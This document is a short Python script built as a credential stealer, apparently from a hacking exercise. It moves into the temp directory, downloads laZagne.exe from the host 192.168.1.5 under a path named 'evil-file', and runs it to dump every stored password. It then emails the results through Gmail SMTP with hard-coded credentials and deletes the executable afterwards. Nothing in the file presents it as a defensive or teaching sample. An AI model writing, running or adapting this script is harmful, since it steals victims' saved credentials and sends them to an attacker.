#!/usr/bin/env python3
import requests
import smtplib
import subprocess
import os

from tempfile import gettempdir


def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(response.content)


def send_mail(email: str, password: str, message: str) -> None:
    server = smtplib.SMTP("smtp.gmail.com", port=587)
    server.starttls()
    server.login(user=email, password=password)
    server.sendmail(from_addr=email, to_addrs=email, msg=message)
    server.quit()


temp_directory = gettempdir()

os.chdir(temp_directory)
download("http://192.168.1.5/evil-file/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("email@email.com", "abc123123", str(result))
os.remove("laZagne.exe")
